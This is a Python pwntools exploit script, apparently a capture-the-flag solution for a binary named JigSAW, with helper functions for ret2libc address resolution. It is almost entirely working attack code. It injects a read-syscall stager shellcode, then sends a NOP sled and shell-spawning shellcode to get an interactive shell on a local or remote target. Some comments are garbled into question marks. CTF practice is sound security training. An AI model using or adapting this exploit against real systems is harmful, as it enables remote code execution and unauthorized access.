#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2021/10/05 12:05:08
# -----------------------------------

from pwn import *
from LibcSearcher import *
import sys, subprocess

arglen = len(sys.argv)
def ret2libc(leak,func,binary=null):
    libc = LibcSearcher(func,leak) if binary == null else binary
    base = leak - libc.dump(func) if binary == null else leak - libc.sym[func]
    system = base + libc.dump('system') if binary == null else base + libc.sym['system']
    binsh = base + libc.dump('str_bin_sh') if binary == null else next(libc.search(b'/bin/sh'))
    return (system,binsh)

s = lambda data : io.send(data)
sa = lambda rv,data : io.sendafter(rv,data)
sl = lambda data : io.sendline(data)
sla = lambda rv,data : io.sendlineafter(rv,data)
r = lambda num : io.recv(num)
rl = lambda keepends=True : io.recvline(keepends)
ru = lambda data,drop=True : io.recvuntil(data,drop)
ia = lambda : io.interactive()
uu32 = lambda data : u32(data.ljust(4,b'\x00'))
uu64 = lambda data : u64(data.ljust(8,b'\x00'))
i16 = lambda data : int(data,16)
leak = lambda name,addr : log.success('\033[33m{}\033[0m = \033[31m{:#x}\033[0m'.format(name, addr))
dbg = lambda point=null: (gdb.attach(io) if point == null else gdb.attach(io,f'b {point}')) if DEBUG else null
og = lambda binary : list(map(int,subprocess.check_output(['one_gadget','--raw','-f',binary]).decode().strip('\n').split(' ')))
rg = lambda binary,only,grep : i16(subprocess.check_output([f"ROPgadget --binary {binary} --only '{only}' | grep {grep}"],shell=True).decode().split(' ')[0])
setlibc = lambda leak,func : leak - libc.sym[func]
libcpath = lambda binary : subprocess.check_output(['ldd',binary]).decode().replace('\t', '').split('\n')[1].split(' ')[2] if GLIBC else subprocess.check_output(['ls | grep *.so'],shell=True).decode().replace('\n', '')
proc = lambda binary,libc=null : process(binary) if GLIBC else process(binary,env={'LD_PRELOAD':'./'+libc})

# context.log_level='debug'
context.arch='amd64'
context.terminal = ['gnome-terminal','-x', 'bash','-c']
# 0??????????????????dbg
DEBUG = 1
# 0??????????????????????????????libc???1????????????patcher?????????glibc
GLIBC = 1
binary = './JigSAW'
elf = ELF(binary)
libc = ELF(libcpath(binary))
libc.path = libcpath(binary)
io = proc(binary,libc.path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

sla("Name:","woodwhale")
sla("Make your Choice:",str(u64(p32(0)+p32(15))))

# add 0
sla("Choice : ","1")
sla("Index? : ","0")

shellcode = '''
xor rdi, rdi
mov rsi, rdx
mov rdx, 0x1000
syscall
'''
shellcode = asm(shellcode)

# edit 0
sla("Choice : ","2")
sla("Index? : ","0")
sla("iNput:",shellcode)

# test 0
sla("Choice : ","4")
sla("Index? : ","0")

# get shell
sl(b'\x90' * 0x10 + asm(shellcraft.sh()))
# dbg()
ia()